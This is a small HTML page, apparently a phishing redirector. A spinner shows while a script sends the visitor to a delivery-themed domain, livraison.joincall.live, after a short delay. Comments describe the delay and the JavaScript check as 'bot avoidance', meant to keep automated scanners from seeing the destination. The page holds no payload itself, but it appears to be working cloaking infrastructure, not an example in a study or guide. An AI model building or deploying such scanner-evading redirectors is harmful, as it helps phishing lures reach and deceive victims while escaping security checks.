<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <span class="loader"></span>
    <style>
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #FFF;
            border-bottom-color: #cbce14;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
            }

            @keyframes rotation {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
            } 
    </style>
</head>
<body>
    <p>If you are not redirected automatically, <a id="redirect-link" href="https://livraison.joincall.live">click here</a>.</p>

    <script>
        // Simple bot avoidance: wait a bit, then redirect
        setTimeout(function () {
            // Optionally check for browser features (bots often lack them)
            if (navigator.userAgent && navigator.userAgent.length > 0) {
                window.location.href = "https://livraison.joincall.live";
            }
        }, 100);
    </script>

    <noscript>
        <!-- No JavaScript means probably a bot -->
        <p>JavaScript is required to access this page.</p>
    </noscript>
</body>
</html>
